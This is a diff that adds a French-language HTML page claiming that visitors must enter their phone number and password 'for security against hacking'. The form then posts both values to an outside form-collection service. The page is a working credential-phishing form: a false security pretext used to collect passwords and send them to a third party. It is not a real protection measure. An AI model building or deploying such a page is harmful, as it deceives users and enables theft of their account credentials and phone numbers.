@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire avec Téléphone et Mot de Passe</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        .form-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .form-container img {
+            width: 100px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .form-container h2 {
+            margin-bottom: 10px;
+        }
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .form-container button {
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .form-container button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <img src="Design sans titre.png" alt="Logo">
+        <h2>Bienvenue! En raison de sécurité contre le piratage veuillez entré vos coordonné et enregisté vos donné </h2>
+        <form action="https://formspree.io/f/xknddkbg" method="post">
+            <input type="tel" name="telephone" placeholder="Numéro de téléphone" required>
+            <input type="tel" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Soumettre</button>
+        </form>
+    </div>
+</body>
+</html>
